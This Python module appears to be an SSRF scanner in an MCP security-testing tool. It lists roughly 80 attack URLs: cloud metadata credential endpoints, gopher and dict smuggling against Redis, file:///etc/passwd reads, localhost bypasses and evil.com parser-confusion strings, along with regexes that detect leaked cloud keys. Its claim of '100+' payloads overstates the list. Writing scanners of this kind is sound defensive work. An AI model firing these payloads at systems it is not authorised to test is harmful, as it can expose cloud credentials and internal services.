"""
SSRF Scanner — detects Server-Side Request Forgery vulnerabilities in MCP tools.

Tests 100+ payloads across 6 categories:
  1. Cloud metadata services (AWS, GCP, Azure, K8s, DigitalOcean, Alibaba)
  2. Internal network scanning (common services/ports)
  3. Localhost bypasses (decimal, hex, octal, IPv6, DNS)
  4. Protocol smuggling (gopher, dict, file, ldap)
  5. URL parser confusion (fragment, @, backslash, encoding)
  6. DNS rebinding
"""

from __future__ import annotations

import re
import logging
from typing import Any

from mcpsec.client.mcp_client import MCPSecClient
from mcpsec.models import Finding, Severity, ServerProfile, ToolInfo
from mcpsec.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ─── Parameter keywords ─────────────────────────────────────────────────────

URL_PARAM_KEYWORDS = [
    "url", "uri", "endpoint", "target", "webhook", "callback", "link",
    "src", "source", "host", "hostname", "address", "server", "proxy",
    "redirect", "forward", "fetch", "load", "request", "api", "service",
    "remote", "download", "href", "location", "origin",
]

# ─── Payloads by category ───────────────────────────────────────────────────

PAYLOADS: dict[str, list[str]] = {
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 1: CLOUD METADATA SERVICES
    # ═══════════════════════════════════════════════════════════════
    "aws_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://169.254.169.254/latest/api/token",
    ],

    "gcp_metadata": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ],

    "azure_metadata": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],

    "kubernetes": [
        "https://kubernetes.default.svc/",
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/secrets",
        "http://10.0.0.1:443/",
        "https://10.96.0.1/",
    ],

    "other_cloud": [
        "http://100.100.100.200/latest/meta-data/",        # Alibaba
        "http://169.254.169.254/metadata/v1/",              # DigitalOcean
        "http://169.254.169.254/opc/v2/instance/",          # Oracle Cloud
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 2: INTERNAL NETWORK SCANNING
    # ═══════════════════════════════════════════════════════════════
    "internal_services": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:6379/",         # Redis
        "http://127.0.0.1:11211/",        # Memcached
        "http://127.0.0.1:9200/",         # Elasticsearch
        "http://127.0.0.1:27017/",        # MongoDB
        "http://127.0.0.1:5432/",         # PostgreSQL
        "http://127.0.0.1:3306/",         # MySQL
        "http://127.0.0.1:8500/",         # Consul
        "http://127.0.0.1:2379/",         # etcd
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:9090/",         # Prometheus
        "http://127.0.0.1:3000/",         # Grafana
    ],

    "internal_networks": [
        "http://10.0.0.1/",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
        "http://192.168.0.1/",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 3: LOCALHOST BYPASSES
    # ═══════════════════════════════════════════════════════════════
    "localhost_bypass": [
        "http://0.0.0.0/",
        "http://0/",
        "http://[::]/",
        "http://[::1]/",
        "http://127.1/",
        "http://127.0.1/",
        "http://127.000.000.001/",
        "http://2130706433/",                  # Decimal 127.0.0.1
        "http://0x7f000001/",                  # Hex
        "http://0177.0.0.1/",                  # Octal
        "http://localhost.localdomain/",
        "http://localtest.me/",
        "http://127.0.0.1.nip.io/",
    ],

    "ipv6_bypass": [
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://[::ffff:7f00:1]/",
        "http://[::1]:80/",
        "http://[::1]:8080/",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 4: PROTOCOL SMUGGLING
    # ═══════════════════════════════════════════════════════════════
    "protocol_smuggling": [
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",
        "gopher://127.0.0.1:11211/_stats%0d%0aquit%0d%0a",
        "dict://127.0.0.1:6379/INFO",
        "file:///etc/passwd",
        "file:///C:/windows/win.ini",
        "sftp://evil.com/",
        "tftp://evil.com/file",
        "ldap://evil.com/%0astats%0aquit",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 5: URL PARSER CONFUSION
    # ═══════════════════════════════════════════════════════════════
    "parser_confusion": [
        "http://evil.com#@169.254.169.254/",
        "http://evil.com?@169.254.169.254/",
        "http://169.254.169.254\\@evil.com/",
        "http://169.254.169.254%2523@evil.com/",
        "http://evil.com:80@169.254.169.254/",
        "http://evil.com:80#@169.254.169.254/",
        "http://169.254.169.254@evil.com/",
        "http://foo@169.254.169.254:80@evil.com/",
        "http://169.254.169.254/.evil.com/",
        "http://169.254.169.254/..;/",
    ],

    "url_encoding_bypass": [
        "http://169.254.169.254%2f",
        "http://169%2e254%2e169%2e254/",
        "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
        "http://169.254.169.254/%2e%2e/",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 6: DNS REBINDING
    # ═══════════════════════════════════════════════════════════════
    "dns_rebinding": [
        "http://A.169.254.169.254.1time.127.0.0.1.forever.rebind.network/",
        "http://make-169.254.169.254-rebind-127.0.0.1-rr.1u.ms/",
    ],
}

# ─── Success indicators ──────────────────────────────────────────────────────

SUCCESS_INDICATORS: dict[str, list[str]] = {
    "aws": [
        r"ami-id",
        r"instance-id",
        r"iam/security-credentials",
        r"AccessKeyId",
        r"SecretAccessKey",
        r"InstanceProfileArn",
    ],
    "gcp": [
        r"Metadata-Flavor:\s*Google",
        r"project/project-id",
        r"access_token",
    ],
    "azure": [
        r'"vmId"',
        r'"subscriptionId"',
        r"Metadata:\s*true",
    ],
    "kubernetes": [
        r'"apiVersion"',
        r'"kind":\s*"(Namespace|Secret|Pod|Service)"',
    ],
    "internal_services": [
        r"SSH-2\.0-",
        r"redis_version",
        r"PONG",
        r"elasticsearch",
        r"MongoDB",
        r"consul",
        r"etcd",
    ],
    "file_read": [
        r"root:x?:0:0",
        r"\[extensions\]",
        r"\[fonts\]",
    ],
    "error_leaks": [
        r"Connection refused",
        r"ECONNREFUSED",
        r"getaddrinfo ENOTFOUND",
        r"No route to host",
        r"Connection timed out",
        r"Could not resolve host",
    ],
}

# Flatten payloads
_ALL_PAYLOADS = []
for category_payloads in PAYLOADS.values():
    _ALL_PAYLOADS.extend(category_payloads)


def _extract_response(result: Any) -> str:
    """Extract text from an MCP tool call result."""
    text = ""
    if hasattr(result, 'content'):
        for block in result.content:
            if hasattr(block, 'text'):
                text += block.text
    return text


def _check_indicators(response_text: str) -> tuple[str, str]:
    """Check response against SSRF success indicators."""
    # Strong evidence: cloud metadata
    for cat in ("aws", "gcp", "azure", "kubernetes"):
        for pattern in SUCCESS_INDICATORS[cat]:
            if re.search(pattern, response_text, re.IGNORECASE):
                return f"Cloud metadata indicator ({cat}): {pattern}", "CONFIRMED"

    # Strong evidence: internal service banners
    for pattern in SUCCESS_INDICATORS["internal_services"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Internal service detected: {pattern}", "CONFIRMED"

    # Strong evidence: file contents
    for pattern in SUCCESS_INDICATORS["file_read"]:
        if re.search(pattern, response_text):
            return f"File contents via SSRF: {pattern}", "CONFIRMED"

    # Weak evidence: connection errors revealing network topology
    for pattern in SUCCESS_INDICATORS["error_leaks"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Network topology leaked: {pattern}", "LIKELY"

    return "", ""


class SSRFScanner(BaseScanner):
    """
    Scans for SSRF vulnerabilities using 100+ payloads across 6 categories
    with confirmation-based detection and cloud metadata targeting.
    """

    name = "ssrf"
    description = "Detect SSRF with 100+ payloads targeting cloud metadata, internal services, and protocol smuggling"

    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
        findings: list[Finding] = []
        if not client:
            return findings

        for tool in profile.tools:
            url_params = set()

            for param_name in tool.parameters:
                if any(kw in param_name.lower() for kw in URL_PARAM_KEYWORDS):
                    url_params.add(param_name)

            raw_props = tool.raw_schema.get("inputSchema", {}).get("properties", {})
            for param_name, param_def in raw_props.items():
                if param_def.get("type") == "string":
                    url_params.add(param_name)

            if not url_params:
                continue

            for param_name in url_params:
                found_vuln = False
                for payload in _ALL_PAYLOADS:
                    if found_vuln:
                        break
                    try:
                        result = await client.call_tool(tool.name, {param_name: payload})
                        response_text = _extract_response(result)
                        is_error = getattr(result, 'isError', False)

                        evidence, confidence = _check_indicators(response_text)

                        if evidence:
                            severity = Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
                            findings.append(Finding(
                                severity=severity,
                                scanner=self.name,
                                tool_name=tool.name,
                                parameter=param_name,
                                title=f"SSRF in '{param_name}' [{confidence}]",
                                description=(
                                    f"Tool '{tool.name}' is vulnerable to Server-Side Request Forgery "
                                    f"via the '{param_name}' parameter."
                                ),
                                detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
                                evidence=evidence,
                                confidence=confidence.lower(),
                                remediation=(
                                    "Implement an allowlist of permitted domains/IPs. "
                                    "Disable non-HTTP protocols (file://, gopher://, dict://). "
                                    "Use a dedicated egress proxy. Block access to 169.254.169.254 "
                                    "and internal networks (10.x, 172.16-31.x, 192.168.x)."
                                ),
                                cwe="CWE-918",
                            ))
                            found_vuln = True

                    except Exception as e:
                        logger.debug(f"Error testing {tool.name}/{param_name}: {e}")

        return findings
